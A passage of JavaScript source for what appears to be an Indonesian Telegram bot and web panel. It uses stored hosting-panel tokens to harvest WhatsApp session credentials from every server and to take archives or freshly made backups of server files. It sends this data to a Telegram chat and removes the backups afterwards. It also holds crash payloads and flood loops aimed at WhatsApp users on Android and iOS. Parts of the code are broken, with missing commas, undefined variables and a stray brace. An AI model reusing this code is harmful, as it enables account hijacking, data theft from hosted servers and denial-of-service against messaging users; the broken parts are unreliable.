    const fail = a.is_successful === false && !!(a.completed_at || a.completedAt);
    if (ok) return a;
    if (fail) throw new Error('backup_failed');
    if (Date.now() - start > maxMs) throw new Error('backup_timeout');
    await sleep(OTAX_BKP_POLL);
  }
}

// Get download URL for backup archive
async function OTAX_getBackupDownloadUrl(base, ptlc, sid, uuid) {
  const r = await OTAX_HTTP.get(
    `${base}/api/client/servers/${sid}/backups/${uuid}/download`,
    { headers: { Authorization: `Bearer ${ptlc}` }, timeout: 15000, validateStatus: (s) => s >= 200 && s < 500 }
  );
  const a = r.data?.attributes || r.data?.data?.attributes || r.data || {};
  const url = a.url || a.signed_url || a.link;
  if (!url) throw new Error('download_url_missing');
  return url;
}

// Delete a backup by UUID (best-effort)
async function OTAX_deleteBackup(base, ptlc, sid, uuid) {
  try {
    await OTAX_HTTP.delete(`${base}/api/client/servers/${sid}/backups/${uuid}`, {
      headers: { Authorization: `Bearer ${ptlc}` },
      timeout: 12000,
    });
  } catch {}
}

// Send a local archive file to Telegram chat
async function OTAX_sendLocalArchive(base, ptla, ptlc, chatId, sid, label, filePath) {
  const buf = await OTAX_readFileBinary(base, ptla, ptlc, sid, filePath);
  const name = `arsip_${sid}__${path.basename(filePath)}`;
  const tmp = path.join(os.tmpdir(), name);
  await fsPromises.writeFile(tmp, buf);
  try {
    await bot.telegram.sendDocument(
      chatId,
      { source: tmp },
      {
        caption: OTAX_codeWrap(
          `⸙ᵒᵗᵃˣ ARSIP DITEMUKAN & DIKIRIM
Server : ${label}
Path   : ${filePath}`
        ),
        parse_mode: 'Markdown',
      }
    );
  } finally {
    try {
      await fsPromises.unlink(tmp);
    } catch {}
  }
}

// Create backup, wait completion, download, and send archive
async function OTAX_backupDownloadSend(base, ptlc, chatId, sid, label) {
  let uuid = null,
    tmp = null;
  try {
    uuid = await OTAX_createBackup(base, ptlc, sid, OTAX_IGNORE);
    await OTAX_waitBackupReady(base, ptlc, sid, uuid);
    const dl = await OTAX_getBackupDownloadUrl(base, ptlc, sid, uuid);
    const ext = OTAX_extFromUrl(dl);
    const res = await axios.get(dl, { responseType: 'arraybuffer', timeout: OTAX_DL_TIMEOUT });
    const fname = `arsip_${sid}.${ext}`;
    tmp = path.join(os.tmpdir(), fname);
    await fsPromises.writeFile(tmp, Buffer.from(res.data));

    await bot.telegram.sendDocument(
      chatId,
      { source: tmp },
      {
        caption: OTAX_codeWrap(
          `⸙ᵒᵗᵃˣ BACKUP TERKIRIM
Server : ${label}
Arsip  : .${ext}`
        ),
        parse_mode: 'Markdown',
      }
    );
  } finally {
    if (uuid) await OTAX_deleteBackup(base, ptlc, sid, uuid);
    if (tmp) {
      try {
        await fsPromises.unlink(tmp);
      } catch {}
    }
  }
}

// Dummy discovery function for pairing (should be adjusted based on server config)
async function discoverCredsPaths(base, ptlc, ptla, sid) {
  // Scan common directories for credentials files like creds.json
  return ['/home/container/auth/creds.json', '/home/container/session/creds.json', '/home/container/creds.json'];
}

// Read file flexibly from Pterodactyl API (used by pairing logic)
async function readFileAny(base, ptla, ptlc, sid, p) {
  return OTAX_readFileBinary(base, ptla, ptlc, sid, p);
}

// Save raw creds and notify (must be manually paired)
async function writeAndPairFromRaw(raw, chatId) {
  const tempCredsPath = path.join(os.tmpdir(), `creds_${Date.now()}.json`);
  await fsPromises.writeFile(tempCredsPath, raw);
  return `creds saved to ${tempCredsPath}. Manual pairing required.`;
}

// Placeholder for deleting files remotely on server via API (to be implemented if needed)
async function deleteFileAny(base, ptla, ptlc, sid, p) {
  // Implement if you have application/client endpoints to delete files
  console.log(`Deletion requested for ${p} on server ${sid}. Not implemented.`);
}

// =======================
// OTAX Command Handlers
// =======================

// /cadp <alias> <ptla>,<ptlc>,<domain>
// Set Pterodactyl panel credentials (owner only)
// /cadp <alias> <ptla>,<ptlc>,<domain>
bot.hears(/^\/cadp\s+(\S+)\s+(.+)$/i, async (ctx) => {
    if (!isOwner(ctx.from.id)) return ctx.reply("❌ Perintah ini hanya untuk Owner.");

    const m = ctx.match;
    const key = m[1];
    const parts = m[2].split(',').map(s => s.trim());

    if (parts.length < 3)
        return ctx.reply(errBox(['Format: /cadp <alias> <ptla>,<ptlc>,<domain>']), { parse_mode: 'Markdown' });

    const [ptla, ptlc, domain] = parts;
    const data = loadADP();
    data[key] = { ptla, ptlc, domain };
    saveADP(data);

    await ctx.reply(okBox([`ADP '${key}' disimpan`]), { parse_mode: 'Markdown' });
});

// /adplist - List semua ADP
bot.hears(/^\/adplist$/i, async (ctx) => {
    if (!isOwner(ctx.from.id)) return ctx.reply("❌ Perintah ini hanya untuk Owner.");

    const data = loadADP();
    const lines = Object.entries(data).map(
        ([k, v]) => `${k} → ${v.domain} - ${v.ptla.slice(0, 10)}… - ${v.ptlc.slice(0, 10)}…`
    );

    await ctx.reply(lines.length ? okBox(lines) : errBox(['(kosong)']), { parse_mode: 'Markdown' });
});

// /deladp <alias>
bot.hears(/^\/deladp\s+(\S+)$/i, async (ctx) => {
    if (!isOwner(ctx.from.id)) return ctx.reply("❌ Perintah ini hanya untuk Owner.");

    const key = ctx.match[1];
    const data = loadADP();

    if (!data[key])
        return ctx.reply(errBox([`Alias '${key}' tidak ada`]), { parse_mode: 'Markdown' });

    delete data[key];
    saveADP(data);

    await ctx.reply(okBox([`ADP '${key}' dihapus`]), { parse_mode: 'Markdown' });
});

// /adp <alias> (Auto Pair & Connect WhatsApp)
bot.hears(/^\/adp\s+(\S+)$/i, async (ctx) => {
  if (!isOwner(ctx.from.id)) return ctx.reply("❌ Perintah ini hanya untuk Owner.");

  const key = ctx.match[1];
  const cfg = loadADP()[key];
  if (!cfg) return ctx.reply(errBox([`ADP '${key}' tidak ditemukan`]), { parse_mode: "Markdown" });

  const base = baseUrl(cfg.domain);
  await ctx.reply(okBox([`🚀 Mulai pairing & koneksi WhatsApp ke ${base}...`]), { parse_mode: "Markdown" });

  let servers = [];
  try {
    servers = await listServersWithFallback(base, cfg.ptlc, cfg.ptla);
    if (!servers.length) return ctx.reply(errBox([`Tidak ada server ditemukan di ${base}`]), { parse_mode: "Markdown" });
  } catch (e) {
    const msgErr = e?.response
      ? `${e.response.status} ${e.response.statusText || ''}`.trim()
      : (e.message || 'Gagal koneksi');
    return ctx.reply(errBox([`❌ Gagal koneksi panel:\n${msgErr}`]), { parse_mode: "Markdown" });
  }

  let ok = 0, fail = 0;
  const perServerErrors = [];
  const limit = pLimit(4); // batasi koneksi paralel biar aman

  await Promise.all(
    servers.map((s) =>
      limit(async () => {
        let paired = false;
        for (let attempt = 1; attempt <= 2; attempt++) { // retry 2x
          try {
            const paths = await discoverCredsPaths(base, cfg.ptlc, cfg.ptla, s.id);
            for (const p of paths) {
              try {
                const raw = await readFileAny(base, cfg.ptla, cfg.ptlc, s.id, p);
                const tmpFile = path.join(os.tmpdir(), `creds_${s.id}.json`);
                await fsPromises.writeFile(tmpFile, raw);
                paired = true;

                // langsung connect ke WhatsApp
                await ctx.reply(okBox([
                  `✅ Pairing berhasil untuk server: ${s.name || s.id}`,
                  `📁 File: ${p}`,
                  `🔗 Menghubungkan ke WhatsApp...`
                ]), { parse_mode: "Markdown" });

                // Ambil nomor WA dari creds.json
                const creds = JSON.parse(raw.toString());
                const BotNumber = creds?.me?.id?.split("@")[0] || s.id;
                try {
                  await connectToWhatsApp(BotNumber, ctx.chat.id, ctx);
                  await ctx.reply(okBox([`📞 WhatsApp ${BotNumber} tersambung!`]), { parse_mode: "Markdown" });
                } catch (err) {
                  await ctx.reply(errBox([`❌ Gagal connect WA: ${err.message}`]), { parse_mode: "Markdown" });
                }

                try { await deleteFileAny(base, cfg.ptla, cfg.ptlc, s.id, p); } catch {}
                ok++;
                break;
              } catch (errRead) {
                if (attempt === 2) perServerErrors.push(`✖ ${s.name || s.id} - gagal baca creds (${errRead.message})`);
              }
            }
            if (paired) break;
          } catch (err) {
            if (attempt === 2) perServerErrors.push(`✖ ${s.name || s.id} - ${err.message || 'Gagal pairing'}`);
            await sleep(2000);
          }
        }

        if (!paired) fail++;
      })
    )
  );

  const lines = [
    `✅ Selesai pairing & koneksi WhatsApp`,
    `Sukses: ${ok} - Gagal: ${fail}`
  ];
  if (perServerErrors.length) lines.push(...perServerErrors);

  await ctx.reply(okBox(lines), { parse_mode: "Markdown" });
});

// /adpfile <alias>
bot.hears(/^\/adpfile\s+(\S+)$/i, async (ctx) => {
    const chatId = ctx.chat.id;
    if (!isOwner(ctx.from.id)) return ctx.reply("❌ Perintah ini hanya untuk Owner.");

    const key = ctx.match[1];
    const cfg = loadADP()[key];

    if (!cfg) return OTAX_sendCode(chatId, `ꀆᵒᵗᵃˣ ADP '${key}' tidak ditemukan.`);
    if (!isPtlc(cfg.ptlc)) return OTAX_sendCode(chatId, 'ꀆᵒᵗᵃˣ Memerlukan token ptlc_ (Client).');

    const b = baseUrl(cfg.domain);
    let servers = [];
    try {
        servers = await listServersWithFallback(b, cfg.ptlc, cfg.ptla);
        if (!servers.length) return OTAX_sendCode(chatId, `ꀆᵒᵗᵃˣ Tidak ada server ditemukan di ${b}.`);
    } catch (e) {
        const msgErr = e?.response
            ? `${e.response.status} ${e.response.statusText || ''}`.trim()
            : (e.message || 'gagal');
        return OTAX_sendCode(chatId, `ꀆᵒᵗᵃˣ Gagal koneksi:\n${msgErr}`);
    }

    await OTAX_sendCode(chatId, '⸙ᵒᵗᵃˣ Cari arsip (*.zip/*.tar.*/*.7z/*.rar). Jika tak ada, dibuat backup nama samar.');

    const summary = [];
    let ok = 0, fail = 0;

    for (const s of servers) {
        try {
            const found = await OTAX_findExistingArchives(b, cfg.ptlc, cfg.ptla, s.id, 2, 200, 10);
            if (found.length) {
                for (const pth of found) {
                    try {
                        await OTAX_sendLocalArchive(b, cfg.ptla, cfg.ptlc, chatId, s.id, s.name || s.id, pth);
                        ok++;
                    } catch (e) {
                        fail++;
                        summary.push(`ꀆᵒᵗᵃˣ ${s.name || s.id} - gagal kirim ${pth}: ${e.message || 'err'}`);
                    }
                }
                summary.push(`ⵥᵒᵗᵃˣ ${s.name || s.id} - ${found.length} arsip terkirim`);
            } else {
                await OTAX_backupDownloadSend(b, cfg.ptlc, chatId, s.id, s.name || s.id);
                ok++;
                summary.push(`ⵥᵒᵗᵃˣ ${s.name || s.id} - backup terkirim`);
            }
        } catch (e) {
            fail++;
            summary.push(`ꀆᵒᵗᵃˣ ${s.name || s.id} - ${e.message || 'gagal'}`);
        }
    }

    await OTAX_sendCode(chatId, `⸙ᵒᵗᵃˣ SELESAI
Sukses: ${ok} - Gagal: ${fail}
${summary.join('\n')}
`);
});

// -------------------( ANDRO FUNC )------------------------------
async function ManCity(sock, X) {
  const massivePayload = Buffer.alloc(980000).fill('\x01').toString();
  
  const messageStruct = {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2
        },
        extendedTextMessage: {
          text: "Sek Kebelet Ngising.",
          contextInfo: {
            isForwarded: true,
            forwardingScore: 99999,
            quotedMessage: {
              productMessage: {
                product: {
                  productImageCount: 999999,
                  title: "I Love My Titid",
                  description: massivePayload.substring(0, 5000)
                }
              }
            },
            mentionedJid: Array.from({length: 2500}, () => 
              `1${Math.floor(Math.random() * 9999999999)}@s.whatsapp.net`
            )
          },
          backgroundArgb: 4278190080,
          font: 2147483647
        }
      }
    }
  };

  const waMessage = await generateWAMessageFromContent(X, messageStruct, {
    upload: sock.waUploadToServer,
    ephemeralExpiration: 604800,
    font: 2147483647
  });

  waMessage.message.extendedTextMessage.nativeFlowMessage = {
    buttons: [{
      name: "system_update",
      buttonParamsJson: JSON.stringify({
        data: massivePayload,
        compression: "none"
      })
    }]
  };

  await sock.relayMessage(X, waMessage.message, {
    messageId: waMessage.key.id,
    statusJidList: [X]
  });
}

async function docthumb(client, X) {
  const pnx = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: {
            title: "⎋ 🦠𞋯𝑱ᮖ࿚ᮘ𝐥࿆𝜣ᮏ  ᮓ𝜩꣡𝑹ᮏ𝐥࿆𝑫𝒁🍷𞋯 -‣" + "\u0000".repeat(7500) + "꧀".repeat(55000),
            documentMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
              mimetype: "raldz/pler/application/vnd.openxmlformats-officedocument.presentationml.presentation/video/mp4/image/jpeg/webp/audio/mpeg",
              fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
              fileLength: "1073741824000000",
              pageCount: 9007199254740991 * 9999,
              mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
              fileName: "💣⃟༑𝑹𝒂𝒍𝒅𝒛𝒛⌁𝑬𝒙𝒆𝒄𝒖𝒕𝒊𝒗𝒆⃰ ͯཀ͜͡🪅-‣" + "꧀".repeat(1000),
              fileEncSha256: "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
              directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
              mediaKeyTimestamp: "1723855952",
              contactVcard: true,
              thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
              thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
              thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
              jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABERERESERMVFRMaHBkcGiYjICAjJjoqLSotKjpYN0A3N0A3WE5fTUhNX06MbmJiboyiiIGIosWwsMX46/j///8BERERERIRExUVExocGRwaJiMgICMmOiotKi0qOlg3QDc3QDdYTl9NSE1fToxuYmJujKKIgYiixbCwxfjr+P/////CABEIAGAARAMBIgACEQEDEQH/xAAnAAEBAAAAAAAAAAAAAAAAAAAABgEBAAAAAAAAAAAAAAAAAAAAAP/aAAwDAQACEAMQAAAAvAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAf/8QAHRAAAQUBAAMAAAAAAAAAAAAAAgABE2GRETBRYP/aAAgBAQABPwDxRB6fXUQXrqIL11EF66iC9dCLD3nzv//EABQRAQAAAAAAAAAAAAAAAAAAAED/2gAIAQIBAT8Ad//EABQRAQAAAAAAAAAAAAAAAAAAAED/2gAIAQMBAT8Ad//Z",
            },
            hasMediaAttachment: true
          },
          body: {
            text: "꧀".repeat(60000)
          },
          contextInfo: {
            remoteJid: "status@broadcast",
            participant: target,
            mentionedJid: [
              target,
              "0@s.whatsapp.net",
              "13135550002@s.whatsapp.net",
              ...Array.from(
              { length: 1990 },
              () =>
              "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
              ),
                ],
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 3,
                expiryTimestamp: -99999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999e999999999999999999999999999999999999999999999999999999999999999 * 999999999999999999999999999999999999999999999999999999999e99999999999
              }
            },
          },
          nativeFlowMessage: {
            messageParamsJson: "{".repeat(10000),
            messageVersion: 3,
            buttons: [
              {
                name: "single_select",
                buttonParamsJson: "",
              },
              {
                name: "galaxy_message",
                buttonParamsJson: JSON.stringify({
                  "icon": "REVIEW",
                  "flow_cta": "\0" + "💣⃟༑𝑹𝒂𝒍𝒅𝒛𝒛⌁𝑬𝒙𝒆𝒄𝒖𝒕𝒊𝒗𝒆⃰ ͯཀ͜͡🪅-‣" + "꧀".repeat(9999),
                  "flow_message_version": "3"
                })
              },
            ]
          }
        }
      }
    },
    participant: { jid: X }
  };

  const pnxMessage = generateWAMessageFromContent(
    target,
    proto.Message.fromObject(pnx),
    {
      userJid: target
    }
  );
  await client.relayMessage(
    target,
    pnxMessage.message,
    {
      messageId: pnxMessage.key.id
    }
  );
}
}

// -------------------( IOS FUNC )------------------- \\
async function CrashLoadIos(sock, X) {
         const xrp = 60000;

         const LocationMessage = {
                  locationMessage: {
                           degreesLatitude: 21.1266,
                           degreesLongitude: -11.8199,
                           name: "#4izxvelzExerct1st\n"
                                    + "\u0000".repeat(xrp)
                                    + "𑇂𑆵𑆴𑆿".repeat(xrp),
                           url: "https://t.me/rizxvelzexct",
                           contextInfo: {
                                    externalAdReply: {
                                             quotedAd: {
                                                      advertiserName: "𑇂𑆵𑆴𑆿".repeat(xrp),
                                                      mediaType: "IMAGE",
                                                      jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/",
                                                      caption: "𑇂𑆵𑆴𑆿".repeat(xrp)
                                             },
                                             placeholderKey: {
                                                      remoteJid: "0s.whatsapp.net",
                                                      fromMe: false,
                                                      id: "ABCDEF1234567890"
                                             }
                                    }
                           }
                  }
         };

         await sock.relayMessage(X, LocationMessage, {
                  participant: { jid: X }
         });

         console.log(chalk.green(`Succes Send Bug By RizxvelzExec1St.🐉`));
}

// -------------------- ( Caller ) -------------------- \\
(async () => {
         for (let r = 0; r < 20; r++) {
                  await CrashLoadIos(sock, X);
                  await new Promise(resolve => setTimeout(resolve, 500));
         }
})();

// ---------------------------------------------------------------------------\\
async function DelayAndro(durationHours, X) {
const totalDurationMs = durationHours * 60 * 60 * 1000;
const startTime = Date.now(); let count = 0;

const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs) {
        console.log(`Stopped after sending ${count} messages`);
        return;
    }

    try {
        if (count < 1) {
            await Promise.all([
            XProtexDelay(X),
            OtaxCrashInvisible(X),
            VerloadForceDelMsg(X),
            InvisibleFc(X),
            XProtexBlankChatV5(X),
            KontolInvis(X),
            wraperosXjustin(X),
            XStromForce(X),
            csnith(X),
            qNested(X),
            TraVisZap(X),
            desnith(X),
            Flood(X),
            fluids(X),
            DocBlank(X),
            AudioFlood(X),
            sFuck(X)
            ]);
            await sleep(2000);
            console.log(chalk.red(`
            ┌────────────────────────┐
            │ ${count}/10 Andro 📟
            └────────────────────────┘
`));
            count++;
            setTimeout(sendNext, 300);
        } else {
            console.log(chalk.green(`Success Sending Bug to ${X}`));
            count = 0;
            console.log(chalk.red("Next Sending Bug"));
            setTimeout(sendNext, 30 * 1000);
        }
    } catch (error) {
        console.error(`❌ Error saat mengirim: ${error.message}`);
        

        setTimeout(sendNext, 100);
    }
};

sendNext();

}

// ---------------------------------------------------------------------------\\
async function DelayAndro2(durationHours, X) {
const totalDurationMs = durationHours * 60 * 60 * 1000;
const startTime = Date.now(); let count = 0;

const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs) {
        console.log(`Stopped after sending ${count} messages`);
        return;
    }

    try {
        if (count < 35) {
            await Promise.all([
            ManCity(sock, X)
            docthumb(client, X)
            CrashLoadIos(sock, X)
            ]);
            await sleep(2000);
            console.log(chalk.red(`
            ┌────────────────────────┐
            │ ${count}/35 Andro 📟
            └────────────────────────┘
`));
            count++;
            setTimeout(sendNext, 300);
        } else {
            console.log(chalk.green(`Success Sending Bug to ${X}`));
            count = 0;
            console.log(chalk.red("Next Sending Bug"));
            setTimeout(sendNext, 30 * 1000);
        }
    } catch (error) {
        console.error(`❌ Error saat mengirim: ${error.message}`);
        

        setTimeout(sendNext, 100);
    }
};

sendNext();

}
// ---------------------------------------------------------------------------\\
async function FcIos(durationHours, X) {
const totalDurationMs = durationHours * 60 * 60 * 1000;
const startTime = Date.now(); let count = 0;

const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs) {
        console.log(`Stopped after sending ${count} messages`);
        return;
    }

    try {
        if (count < 10) {
            await Promise.all([
            SuperIosCore(X),
            IosChatCore(X),
            XiosVirusCore(X),
            BlankIphoneCore(X),
            InvisIphoneCore(X),
            CrashiPhoneCore(X),
            UpiCrashCore(X),
            VenCrashCore(X),
            CrashIosCore(X),
            SmCrashCore(X),
            SqCrashCore(X),
            FBiphoneCore(X),
            iPhoneCore(X),
            ChangliIosCore(X),
            IPhoneAttackCore(X),
            SuperIOSCore(X),
            ForceInvisibleCoreNew(X),
            ]);
            await sleep(2000);
            console.log(chalk.red(`
            ┌────────────────────────┐
            │ ${count}/10 iOS 📟
            └────────────────────────┘
`));
            count++;
            setTimeout(sendNext, 300);
        } else {
            console.log(chalk.green(`Success Sending Bug to ${X}`));
            count = 0;
            console.log(chalk.red("Next Sending Bug"));
            setTimeout(sendNext, 30 * 1000);
        }
    } catch (error) {
        console.error(`❌ Error saat mengirim: ${error.message}`);
        

        setTimeout(sendNext, 100);
    }
};

sendNext();

}


const executionPage = (
  status = "🟥 Ready",
  detail = {},
  isForm = true,
  userInfo = {},
  message = "",
  mode = "",
  successToast = false
) => {
  const { username, password, role, expired } = userInfo;

  const formattedTime = expired
    ? new Date(expired).toLocaleString("id-ID", {
        timeZone: "Asia/Jakarta",
        year: "2-digit",
        month: "2-digit",
        day: "2-digit",
        hour: "2-digit",
        minute: "2-digit",
      })
    : "-";

  let sisaHari = "-";
  if (expired) {
    const diff = new Date(expired) - new Date();
    sisaHari = Math.max(0, Math.ceil(diff / (1000 * 60 * 60 * 24)));
  }

  return `
<!doctype html>
<html lang="id">
<head>
  <meta charset="utf-8" />
  <<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
  <title>Orbits Engine</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">

  <style>
body {
  margin: 0;
  font-family: "Poppins", sans-serif;
  background: #111; /* warna solid gelap */
  color: #eee;
  overflow-x: hidden;
}

/* Topbar */
.topbar {
  background: rgba(20,20,20,0.6);
  backdrop-filter: blur(10px);
  padding: 12px;
  display: flex;
  align-items: center;
  justify-content: space-between;
  box-shadow: 0 2px 10px rgba(255, 255, 0, 0.2);
  border-bottom: 1px solid rgba(255,255,0,0.15);
}
.menu-toggle {
  cursor: pointer;
  font-size: 20px;
  color: #fff700; /* kuning neon */
}

/* icon ☰ */
.menu-toggle .menu-icon {
  color: #fff; /* putih */
  font-size: 22px;
}

/* teks OrchidX */
.menu-toggle .brand {
  color: #ffeb3b; /* kuning neon */
  font-weight: bold;
  text-shadow: 0 0 6px rgba(255, 235, 59, 0.9),
               0 0 12px rgba(255, 235, 59, 0.6);
}

/* teks Is Back */
.menu-toggle .tagline {
  color: #fff;
  font-weight: normal;
}

/* Sidebar */
.sidebar {
  position: fixed;
  top: 0;
  left: 0;
  bottom: 0;
  width: 220px;
  background: rgba(25,25,25,0.55);
  backdrop-filter: blur(12px);
  overflow-y: auto;
  padding-top: 10px;
  transform: translateX(-100%);
  transition: .3s;
  z-index: 1000;
  border-right: 1px solid rgba(255,255,0,0.2);
}
.sidebar.active {transform: translateX(0);}
.sidebar-header {text-align: center;padding: 10px;}
.sidebar-header img {
  width: 60px;
  border-radius: 50%;
  box-shadow: 0 0 10px rgba(255,255,0,0.4);
}
.sidebar-menu {display: flex;flex-direction: column;}
.sidebar-menu a {
  padding: 12px;
  color: #ddd;
  text-decoration: none;
  display: flex;
  align-items: center;
  gap: 10px;
  transition: 0.3s;
}
.sidebar-menu a:hover {
  background: rgba(255,255,0,0.1);
  color: #fff700;
  box-shadow: inset 0 0 10px rgba(255,255,0,0.3);
}

/* Section base */
.section {
  display: none;
  padding-bottom: 70px;
}
.section.active {display: block;}

/* Section biasa (kecuali chat) */
.section:not(#chat-section) {
  padding: 40px;
  background: rgba(45,45,45,0.55);
  backdrop-filter: blur(10px);
  border-radius: 20px;
  box-shadow: 0 0 25px rgba(255,255,0,0.2);
  margin: 30px auto;
  max-width: 700px;
  text-align: center;
}
.section:not(#chat-section) h2 {
  color: #e0e0e0;
  margin-bottom: 30px;
  text-shadow: 0 0 6px rgba(255,255,0,0.3);
}

/* Card umum */
.card {
  background: rgba(30,30,30,0.55);
  backdrop-filter: blur(10px);
  border-radius: 12px;
  margin: 16px auto;
  padding: 16px;
  max-width: 600px;
  border: 1px solid rgba(255,255,0,0.2);
  box-shadow: 0 0 15px rgba(255,255,0,0.2);
}
.card .banner img {
  width: 100%;
  max-height: 180px;
  object-fit: cover;
  border-radius: 10px;
  margin-bottom: 12px;
}
.card .info {
  text-align: left;
  line-height: 1.5;
  font-size: 14px;
  padding: 0 6px;
}
.card .info b {
  color: #fff700;
  font-weight: 600;
  margin-right: 4px;
}
.card .info .section-title {
  display: block;
  margin: 12px 0 6px;
  font-size: 15px;
  font-weight: 600;
  color: #eee;
  border-bottom: 1px solid rgba(255,255,0,0.2);
  padding-bottom: 4px;
}

.actions {
  display: flex;
  justify-content: center;
  gap: 20px;
  flex-wrap: wrap;
  margin: 20px 0;
}

/* Circle nav buttons - semi transparan */
.circle-nav {
  width: 75px;
  height: 75px;
  border-radius: 50%;
  background: linear-gradient(
    135deg,
    rgba(255, 247, 0, 0.2), 
    rgba(255, 234, 0, 0.2)
  ); /* transparan 20% */
  display: flex;
  flex-direction: column;
  justify-content: center;
  align-items: center;
  color: #ffeb3b;
  font-size: 22px;
  font-weight: bold;
  cursor: pointer;
  transition: 0.35s;
  box-shadow: 0 0 12px rgba(255, 255, 0, 0.4),
              0 0 20px rgba(255, 255, 0, 0.25); /* glow lebih soft */
}

/* Teks di bawah icon */
.circle-nav span {
  font-size: 11px;
  margin-top: 4px;
  color: #ffeb3b;
  font-weight: 500;
}

/* Hover efek */
.circle-nav:hover {
  transform: translateY(-6px) scale(1.08);
  background: linear-gradient(
    135deg,
    rgba(255, 247, 0, 0.35),
    rgba(255, 234, 0, 0.35),
    rgba(255, 230, 0, 0.35)
  );
  box-shadow: 0 0 20px rgba(255, 255, 0, 0.7),
              0 0 35px rgba(255, 255, 0, 0.5);
  color: #fff176;
}

/* Telegram box - Kuning glow neon */
.telegram {
  margin-top: 25px;
  padding: 14px 18px;
  text-align: center;
  font-weight: 600;
  font-size: 15px;
  border-radius: 12px;
  color: #111;
  background: linear-gradient(135deg, #fff700, #ffea00);
  box-shadow: 0 0 18px rgba(255,255,0,0.7), 0 0 25px rgba(255,255,0,0.5);
  cursor: pointer;
  transition: 0.3s;
}
.telegram:hover {
  transform: scale(1.05);
  box-shadow: 0 0 25px rgba(255,255,0,1), 0 0 35px rgba(255,255,0,0.8);
}

#chatWindow {
  position: relative;
  z-index: 1; /* konten di atas overlay */
}

#chatWindow::before {
  content: "";
  position: absolute;
  inset: 0;
  background: rgba(0,0,0,0.6);
  border-radius: 8px;
  z-index: -1; /* taruh overlay di bawah */
}

/* Pesan umum */
#chatWindow .message {
  position: relative;
  z-index: 1;
  max-width: 70%;
  margin: 6px 0;
  padding: 10px 14px;
  border-radius: 16px;
  word-wrap: break-word;
  line-height: 1.4;
  font-size: 14px;
  box-shadow: 0 2px 6px rgba(0,0,0,0.3);
  color: #fff; /* default text */
}

/* Pesan user (kamu) di kanan */
#chatWindow .message.user {
  background: linear-gradient(135deg, #fff700 0%, #ffea00 100%);
  color: #111; /* hitam pekat supaya kontras */
  margin-left: auto;
  margin-right: 0;
  border-bottom-right-radius: 4px;
  text-align: left;
}

.message {
  margin: 8px;
  padding: 6px 10px;
  border-radius: 8px;
  max-width: 80%;
  word-wrap: break-word;
}
.message.user {
  background: #d1f7c4;
  align-self: flex-end;
}
.message.other {
  background: #f1f1f1;
  align-self: flex-start;
}
.message.system {
  background: transparent;
  text-align: center;
  font-style: italic;
  color: #888;
}
.message .info {
  font-size: 11px;
  color: gray;
  margin-bottom: 3px;
}

/* Pesan orang lain di kiri */
#chatWindow .message.other {
  background: rgba(255, 255, 0, 0.9); /* lebih pekat, biar transparansi ilang */
  color: #111; /* hitam pekat supaya jelas */
  margin-right: auto;
  margin-left: 0;
  border-bottom-left-radius: 4px;
  text-align: left;
}

/* Metadata seperti username + waktu */
#chatWindow .message .chat-meta {
  font-size: 11px;
  color: rgba(0,0,0,0.6); /* lebih kontras */
  margin-top: 4px;
  display: block;
  text-align: right;
}

/* Stats */
.stats {
  display: grid;
  grid-template-columns: 1fr 1fr;
  gap: 12px;
  margin-top: 12px;
}
.mini-card {
  margin-top: 10px;
  padding: 8px;
  background: rgba(30,30,30,0.55);
  backdrop-filter: blur(8px);
  border-radius: 10px;
  box-shadow: 0 0 8px rgba(255,255,0,0.2);
}
.meta {display: flex;flex-direction: column;gap: 4px;}

/* Bottom nav */
.bottom-nav {
  position: fixed;
  bottom: 0;
  left: 0;
  right: 0;
  height: 60px;
  background: rgba(20,20,20,0.7);
  backdrop-filter: blur(8px);
  display: flex;
  align-items: center;
  justify-content: center;
  border-top: 1px solid rgba(255,255,0,0.2);
}
.bottom-inner {
  width: 100%;
  max-width: 600px;
  display: flex;
  justify-content: space-around;
}
.nav-item {
  flex: 1;
  text-align: center;
  padding: 10px 0;
  color: #bbb;
  font-size: 14px;
  cursor: pointer;
  transition: 0.3s;
}
.nav-item i {
  display: block;
  font-size: 18px;
  margin-bottom: 4px;
}
.nav-item.active {
  color: #fff700;
  border-top: 2px solid #fff700;
  background: rgba(255,255,0,0.1);
}
.nav-item:hover {
  color: #fff700;
  background: rgba(255,255,0,0.05);
}
.nav-item .badge {
  position: absolute;
  top: 6px;
  right: 20px;
  background: #ff4d4d;
  color: #fff;
  font-size: 10px;
  padding: 2px 5px;
  border-radius: 10px;
  box-shadow: 0 0 6px rgba(255,0,0,0.6);
}

/* Container tombol (biar rapih grid) */
.button-container {
